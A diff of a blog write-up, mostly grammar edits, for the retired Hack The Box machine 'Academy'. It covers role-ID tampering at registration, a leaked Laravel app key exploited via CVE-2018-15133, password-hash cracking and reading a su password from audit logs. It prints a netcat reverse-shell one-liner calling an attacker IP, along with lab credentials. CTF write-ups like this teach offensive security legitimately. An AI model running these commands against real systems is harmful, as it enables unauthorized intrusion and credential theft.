@@ -13,9 +13,9 @@ header:
 
 Hello everyone!
 
-The box of this week will be **Academy**, another easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu) created by [egre55](https://app.hackthebox.eu/users/1190) and [mrb3n](https://app.hackthebox.eu/users/2984).
+The box of this week will be **Academy**, another easy-rated Linux box from [Hack the Box](https://www.hackthebox.eu) created by [egre55](https://app.hackthebox.eu/users/1190) and [mrb3n](https://app.hackthebox.eu/users/2984).
 
-Write-ups for Hack The Box are always posted as soon as machines get retired
+:information_source: **Info**: Write-ups for Hack the Box are always posted as soon as machines get retired
 {: .notice--info}
 
 ## Enumeration
@@ -46,11 +46,11 @@ Nmap done: 1 IP address (1 host up) scanned in 34.43 seconds
 
 ### 80 TCP - HTTP Service
 
-Checking this service from `nmap` scan, noticed that the page contains a redirect to the host **academy.htb**, which probably wasn't able to follow redirect once this domain name wasn't solved. After adding it to the `/etc/hosts`, we were able to navigate to the specified page which contains 2 links, one for registering and other to login to this HTB Academy service.
+Checking this service from `nmap` scan, noticed that the page contains a redirect to the host **academy.htb**, which probably was not able to follow redirect once this domain name was not solved. After adding it to the `/etc/hosts`, we were able to navigate to the specified page which contains 2 links, one for registering and other to login to this HTB Academy service.
 
 ![image-20210217115623157](https://i.imgur.com/jPgHc5K.png){: .align-center}
 
-As the page source didn't disclosed nothing, proceeded by creating a dummy account (`dummy:P@ssword`) to get initial access to the platform but noticed something interesting in the post request, where a hidden field from the register form was sending a parameter **roleid**, set to value **0**. 
+As the page source did not disclosed nothing, proceeded by creating a dummy account (`dummy:P@ssword`) to get initial access to the platform but noticed something interesting in the post request, where a hidden field from the register form was sending a parameter **roleid**, set to value **0**. 
 
 ```
 POST /register.php HTTP/1.1
@@ -71,15 +71,15 @@ Connection: close
 uid=dummy&password=P%40ssw0rd&confirm=P%40ssw0rd&roleid=0
 ```
 
-Let's proceed with the default value for now but we already have an idea of what could be tampered if necessary.
+Let us proceed with the default value for now but we already have an idea of what could be tampered if necessary.
 
-After entering the recently created credentials, noticed that the user was capable of seeing the academy catalog, with some pre-loaded credit but no operation (unlock) was possible once the unlock API (http://academy.htb/api/modules/unlock) wasn't available, returning a HTTP 404 error.
+After entering the recently created credentials, noticed that the user could see the academy catalog, with some pre-loaded credit but no operation (unlock) was possible once the unlock API (http://academy.htb/api/modules/unlock) was not available, returning a HTTP 404 error.
 
 ![image-20210217130138100](https://i.imgur.com/ZWqyaUH.png){: .align-center}
 
 ### Gobuster
 
-Once we came into a dead end, let us see if we can brute force any path on this box that might led us to an possible initial foothold. Running `gobuster` gave us 2 interesting pages to investigate further: **admin.php** and **config.php**.
+Once we came into a dead end, let us see if we can brute force any path on this box that might led us to a possible initial foothold. Running `gobuster` gave us 2 interesting pages to investigate further: **admin.php** and **config.php**.
 
 ```
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://academy.htb -t 50 -o gobuster_80.txt -x php,html,txt
@@ -111,22 +111,22 @@ Progress: 48339 / 220561 (21.92%)in.php (Status: 200)
 
 ### admin.php
 
-Accessing `admin.php` noticed that this pace looks very similar to the previous one, but our dummy credentials didn't worked there. So remembering from the parameter we saw in the registration form (**roleid**), I decided to create another account but in this case tampering the data sent in the request, replacing 0 by 1 for the mentioned identifier. With this new account, which roleid = **1**, I was able to login to the restricted area and the page below was displayed:
+Accessing `admin.php` noticed that this pace looks very similar to the previous one, but our dummy credentials did not work there. So, remembering from the parameter we saw in the registration form (**roleid**), I decided to create another account but, in this case, tampering the data sent in the request, replacing 0 by 1 for the mentioned identifier. With this new account, which roleid = **1**, I was able to login to the restricted area and the page below was displayed:
 
 ![image-20210217131705459](https://i.imgur.com/s54Fy4z.png){: .align-center}
 
 Besides not existing any information hidden in the source code of this page, what called attention was the host **dev-staging-01.academy.htb** which might also be running in this box. 
 
-After adding it to the hosts file under the same IP, the page below was shown, which is a error handler framework for PHP, which allows developers to debug code in their code, but in this case was open and leaking lots of information such as credentials and environment variables.
+After adding it to the hosts file under the same IP, the page below was shown, which is an error handler framework for PHP, which allows developers to debug code in their code, but in this case was open and leaking lots of information such as credentials and environment variables.
 
 ![image-20210217132525919](https://i.imgur.com/EdXyUeb.png){: .align-center}
 
 What most called attention in the information leaked was the MySQL credentials and Laravel App_key, which might lead us to an initial foothold in this box.
 
 ## Initial Foothold
-As we don't have MySQL 3306/TCP open in this box, based on the initial nmap scan, searching a little about what could be done by using the Laravel App_key I came across the [CVE-2018-15133](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133) which can lead to RCE through an unserialize call in some affected Laravel versions. If we were lucky this might work for this box :smiley:.
+As we don't have MySQL 3306/TCP open in this box, based on the initial nmap scan, searching a little about what could be done by using the Laravel App_key I came across the [CVE-2018-15133](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133) which can lead to RCE through an unserialized call in some affected Laravel versions. If we were lucky this might work for this box :smiley:.
 
-Doing some search I have found [this repository](https://github.com/aljavier/exploit_laravel_cve-2018-15133) which implements this exploit in a simple manner, which was the one I have used to get an initial foothold in the box.
+Doing some search, I have found [this repository](https://github.com/aljavier/exploit_laravel_cve-2018-15133) which implements this exploit in a simple manner, which was the one I have used to get an initial foothold in the box.
 
 ```
 $ python3 ./pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f"
@@ -146,7 +146,7 @@ $link=mysqli_connect('localhost','root','GkEWXn4h34g8qx9fZ1','academy');
 ?>
 ```
 
-Connecting to local instance of MySQL using the obtained credentials, noticed that there was some users created and their password hashes, that could possibly be reused by one of the existing users of this box.
+Connecting to local instance of MySQL using the obtained credentials, noticed that there were some users created and their password hashes, that could possibly be reused by one of the existing users of this box.
 
 ```
 $ mysql -u root -p
@@ -177,7 +177,7 @@ After some research, found that these passwords were hashed using MD5 prior to s
 - test2: **test2**
 - tester: **test**
 
-Now that we have a few password, we need to check which user possibly has the user flag. By running the command below we have identified user **cry0l1t3** as the one we should test the obtained passwords so far:
+Now that we have a few passwords, we need to check which user possibly has the user flag. By running the command below, we have identified user **cry0l1t3** as the one we should test the obtained passwords so far:
 
 ```
 www-data@academy:/home$ find /home -type f 2>/dev/null | grep user.txt
@@ -194,7 +194,7 @@ cry0l1t3@academy:~$ cat user.txt
 ## Root flag
 ### Enumeration
 
-Now running as cry0l1t3, we can enumerate further this box. The first thing to do is to check his permissions. The user `cry0l1t3` cannot run anything as root, based on `sudo -l` execution but he's member of **adm** group, which allow us to read contents from `/var/log` which might leak some information.
+Now running as cry0l1t3, we can enumerate further this box. The first thing to do is to check his permissions. The user `cry0l1t3` cannot run anything as root, based on `sudo -l` execution but he is member of **adm** group, which allow us to read contents from `/var/log` which might leak some information.
 
 ```
 cry0l1t3@academy:~$ sudo -l
@@ -204,7 +204,7 @@ cry0l1t3@academy:~$ id
 uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
 ```
 
-Always when inspecting the logs from a CTF box, is important to consider its creation time, so all the other player registry entries can be ignored from the inspection. An easier way is to use the command below, which filters only files older than X days, in my case 100 which is the period of days since this box was released in the time I'm solving it.
+Always when inspecting the logs from a CTF box, is important to consider its creation time, so all the other player registry entries can be ignored from the inspection. An easier way is to use the command below, which filters only files older than X days, in my case 100 which is the period of days since this box was released in the moment I am solving it.
 
 ```
 find /var/log -mtime +100 -print 2>/dev/null
@@ -212,7 +212,7 @@ find /var/log -mtime +100 -print 2>/dev/null
 
 Checking first the apache logs, nothing interesting was found by inspecting the access logs, so the most interesting in sequence are the audit logs and then any cron execution.
 
-Checking the audit logs we can see 2 files matching the mentioned period, which will later be inspected.
+Checking the audit logs, we can see 2 files matching the mentioned period, which will later be inspected.
 
 ```
 cry0l1t3@academy:~$ find . -mtime +100 -print 2>/dev/null | grep audit
@@ -227,7 +227,7 @@ cry0l1t3@academy:~$ cat /var/log/audit/audit.log.[2-3] | grep '"su"'
 type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
 ```
 
-The data field contains the HEX value of the parameter used in the execution, which can be converted to text. You can use any converter online but you can also use `vim` to this task, as described below:
+The data field contains the HEX value of the parameter used in the execution, which can be converted to text. You can use any converter online, but you can also use `vim` to this task, as described below:
 
 - Open a file in edit mode using `vim`
 
